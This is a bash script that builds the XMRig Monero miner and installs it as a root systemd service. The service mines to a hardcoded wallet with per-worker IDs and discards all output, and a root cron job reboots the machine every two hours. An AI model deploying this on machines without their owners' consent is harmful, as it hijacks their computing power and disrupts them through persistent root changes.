#!/bin/bash
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "ERROR: Please run this script as root or with sudo." >&2
  exit 1
fi

BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
WORKER_ID="${1:-A00001}"
WALLET="$BASE_WALLET.$WORKER_ID"

CPU_CORES=$(nproc)
THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))

echo "Using wallet: $WALLET"
echo "Mining on $THREADS threads (CPU cores: $CPU_CORES)"

echo "Updating package lists..."
apt update

echo "Installing required packages..."
apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin

echo "Setting memlock limits..."
if ! grep -q '* soft memlock 262144' /etc/security/limits.conf; then
  echo -e "* soft memlock 262144\n* hard memlock 262144" >> /etc/security/limits.conf
fi

echo "Updating PAM session files..."
for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
  if ! grep -q pam_limits.so "$f"; then
    echo 'session required pam_limits.so' >> "$f"
  fi
done

echo "Setting hugepages..."
if ! grep -q 'vm.nr_hugepages=128' /etc/sysctl.conf; then
  echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
fi
sysctl -p

echo "Setting screen capabilities..."
setcap cap_sys_nice=eip "$(which screen)"

echo "Preparing XMRig source code..."
cd /root

if [ ! -d xmrig ]; then
  echo "Cloning xmrig repository..."
  git clone https://github.com/xmrig/xmrig.git
fi

cd xmrig
mkdir -p build
cd build

echo "Running cmake..."
cmake ..

echo "Compiling XMRig miner..."
make -j"$CPU_CORES"

echo "Creating systemd service file..."
cat >/etc/systemd/system/xmrig.service <<EOF
[Unit]
Description=XMRig Miner Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/root/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
Restart=always
LimitMEMLOCK=infinity
User=root
WorkingDirectory=/root/xmrig/build
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/xmrig.service

echo "Reloading systemd daemon and enabling service..."
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

echo "Scheduling reboot every 2 hours..."
(sudo crontab -l 2>/dev/null | grep -v '/sbin/reboot' || true; echo "0 */2 * * * /sbin/reboot") | sudo crontab -

echo "Verifying reboot schedule..."
if ! sudo crontab -l 2>/dev/null | grep -q '/sbin/reboot'; then
  echo "ERROR: Reboot schedule NOT set in crontab!"
  exit 1
fi

echo "Verifying xmrig service status..."
if ! systemctl is-enabled xmrig &>/dev/null; then
  echo "ERROR: xmrig service is NOT enabled!"
  exit 1
fi

if ! systemctl is-active xmrig &>/dev/null; then
  echo "ERROR: xmrig service is NOT active!"
  exit 1
fi

echo "--------------------------------------"
echo "Setup complete."
echo "Miner running with wallet: $WALLET"
echo "Reboot scheduled every 2 hours."
echo "--------------------------------------"
